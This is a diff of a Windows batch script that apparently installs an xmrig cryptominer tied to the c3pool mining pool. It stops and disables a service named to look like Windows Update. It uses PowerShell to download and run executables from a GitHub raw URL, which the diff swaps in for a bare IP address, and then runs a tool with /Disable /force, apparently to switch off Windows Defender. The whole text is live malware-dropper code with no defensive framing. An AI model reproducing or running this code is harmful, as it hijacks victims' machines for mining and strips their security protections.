@@ -179,7 +179,7 @@ IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR0
 
 net stop wuausery
 sc config wuausery start=disabled
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://45.138.68.29:1314/win.exe', '%USERPROFILE%\win.exe')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/win.exe', '%USERPROFILE%\win.exe')"
 "%USERPROFILE%\win.exe" >NUL
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/WDControl_1.7.0.exe', '%USERPROFILE%\WDControl_1.7.0.exe')"
 "%USERPROFILE%\WDControl_1.7.0.exe" /Disable /force>NUL
